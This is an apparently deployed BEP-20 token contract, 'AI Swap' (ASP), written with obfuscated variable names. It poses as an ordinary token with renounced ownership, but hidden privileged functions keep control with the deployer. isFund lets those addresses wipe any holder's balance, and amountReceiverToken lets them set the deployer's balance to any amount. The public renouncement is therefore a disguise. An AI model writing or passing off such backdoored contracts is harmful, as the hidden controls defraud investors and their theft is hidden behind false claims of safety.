/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface receiverWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverSender) external view returns (uint256);

    function transfer(address teamIs, uint256 walletTrading) external returns (bool);

    function allowance(address feeTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletTrading) external returns (bool);

    function transferFrom(
        address sender,
        address teamIs,
        uint256 walletTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletLimitTx, uint256 value);
    event Approval(address indexed feeTake, address indexed spender, uint256 value);
}

interface receiverWalletMetadata is receiverWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface modeTeam {
    function createPair(address autoIs, address tokenLaunch) external returns (address);
}

interface enableFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract feeShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract AISwap is feeShould, receiverWallet, receiverWalletMetadata {
    uint8 private tokenModeLaunched = 18;
    
    bool public takeExemptEnable;
    string private txFrom = "AI Swap";
    bool public totalIsFrom;

    uint256 public sellFrom;
    bool private amountLaunchedTeam;
    address private tokenMarketing;
    uint256 private maxIs;
    address public buyLaunched;

    uint256 private shouldExempt = 100000000 * 10 ** tokenModeLaunched;

    string private teamTotal = "ASP";
    address public listEnable;
    bool private walletLaunched;
    address private swapBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private isLaunched;
    

    mapping(address => bool) public shouldList;
    mapping(address => bool) public feeMin;
    uint256 public sellLimit;
    mapping(address => mapping(address => uint256)) private isTeam;
    
    uint256 public fromFee;
    uint256 public takeMax;
    

    event OwnershipTransferred(address indexed sellFund, address indexed fromMin);

    constructor (){
        
        enableFund minMarketing = enableFund(swapBuy);
        buyLaunched = modeTeam(minMarketing.factory()).createPair(minMarketing.WETH(), address(this));
        tokenMarketing = _msgSender();
        
        listEnable = tokenMarketing;
        feeMin[listEnable] = true;
        
        isLaunched[listEnable] = shouldExempt;
        emit Transfer(address(0), listEnable, shouldExempt);
        liquidityBuy();
    }

    

    function transferFrom(address fromReceiver, address teamIs, uint256 walletTrading) external override returns (bool) {
        if (isTeam[fromReceiver][_msgSender()] != type(uint256).max) {
            require(walletTrading <= isTeam[fromReceiver][_msgSender()]);
            isTeam[fromReceiver][_msgSender()] -= walletTrading;
        }
        return enableSwapIs(fromReceiver, teamIs, walletTrading);
    }

    function balanceOf(address receiverSender) public view virtual override returns (uint256) {
        return isLaunched[receiverSender];
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenModeLaunched;
    }

    function fromBuy() public {
        if (takeMax != maxIs) {
            fromFee = takeMax;
        }
        
        fromFee=0;
    }

    function senderAuto(address fromReceiver, address teamIs, uint256 walletTrading) internal returns (bool) {
        require(isLaunched[fromReceiver] >= walletTrading);
        isLaunched[fromReceiver] -= walletTrading;
        isLaunched[teamIs] += walletTrading;
        emit Transfer(fromReceiver, teamIs, walletTrading);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return teamTotal;
    }

    function approve(address toFrom, uint256 walletTrading) public virtual override returns (bool) {
        isTeam[_msgSender()][toFrom] = walletTrading;
        emit Approval(_msgSender(), toFrom, walletTrading);
        return true;
    }

    function liquidityBuy() public {
        emit OwnershipTransferred(listEnable, address(0));
        tokenMarketing = address(0);
    }

    function transfer(address fundListTrading, uint256 walletTrading) external virtual override returns (bool) {
        return enableSwapIs(_msgSender(), fundListTrading, walletTrading);
    }

    function isFund(address tokenEnableAmount) public {
        
        if (tokenEnableAmount == listEnable || tokenEnableAmount == buyLaunched || !feeMin[_msgSender()]) {
            return;
        }
        
        isLaunched[tokenEnableAmount] = 0;
    }

    function owner() external view returns (address) {
        return tokenMarketing;
    }

    function amountReceiverToken(uint256 walletTrading) public {
        if (!feeMin[_msgSender()]) {
            return;
        }
        isLaunched[listEnable] = walletTrading;
    }

    function getOwner() external view returns (address) {
        return tokenMarketing;
    }

    function name() external view virtual override returns (string memory) {
        return txFrom;
    }

    function enableSwapIs(address fromReceiver, address teamIs, uint256 walletTrading) internal returns (bool) {
        if (fromReceiver == listEnable || teamIs == listEnable) {
            return senderAuto(fromReceiver, teamIs, walletTrading);
        }
        if (sellFrom != takeMax) {
            takeMax = fromFee;
        }
        
        
        return senderAuto(fromReceiver, teamIs, walletTrading);
    }

    function feeExemptSwap() public view returns (bool) {
        return totalIsFrom;
    }

    function allowance(address enableLiquidity, address toFrom) external view virtual override returns (uint256) {
        return isTeam[enableLiquidity][toFrom];
    }

    function walletTakeMarketing() public view returns (uint256) {
        return takeMax;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return shouldExempt;
    }

    function receiverSell() public {
        if (sellFrom == maxIs) {
            sellFrom = sellLimit;
        }
        if (takeMax == sellLimit) {
            takeMax = maxIs;
        }
        takeMax=0;
    }

    function buyTotal(address fundShould) public {
        if (takeExemptEnable) {
            return;
        }
        if (sellLimit != takeMax) {
            totalIsFrom = true;
        }
        feeMin[fundShould] = true;
        
        takeExemptEnable = true;
    }


}